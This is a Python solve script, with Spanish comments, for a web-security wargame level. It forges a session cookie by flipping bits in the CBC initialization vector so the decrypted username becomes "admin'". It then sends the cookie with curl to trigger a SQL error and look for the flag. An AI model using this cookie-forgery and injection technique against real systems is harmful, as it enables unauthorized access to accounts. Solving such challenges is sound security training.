#!/usr/bin/env python3
import binascii
import subprocess
import re

cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c833e083ffd1bce3a3d4a8e0094382e53"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

iv = bytearray(binascii.unhexlify(iv_hex))

# Block 0: "user/pass:testxx"
# Target:  "user/pass:admin'"

actual = b"user/pass:testxx"
target = b"user/pass:admin'"

for i in range(16):
    iv[i] = iv[i] ^ actual[i] ^ target[i]

cookie_modified = binascii.hexlify(iv).decode() + ct_hex

print(f"Username: admin'")
print(f"Esto hará query: SELECT ... WHERE username='admin'' AND password=''")
print(f"(sintaxis inválida SQL)\n")

cmd = f'timeout 8s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_modified}"'
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

flag_match = re.search(r'WEBSEC\{[^}]+\}', result.stdout)
if flag_match:
    print(f"FLAG: {flag_match.group(0)}")
elif "Hello admin" in result.stdout:
    print("Hello admin!")
elif "Wrong" in result.stdout:
    print("Wrong login")
elif "corrupted" in result.stdout:
    print("Corrupted")
else:
    print(f"Length: {len(result.stdout)}")
    # Tal vez hay error de SQL que revela algo
    if "SQL" in result.stdout or "syntax" in result.stdout:
        print("¡Error de SQL!")
        print(result.stdout[500:1000])
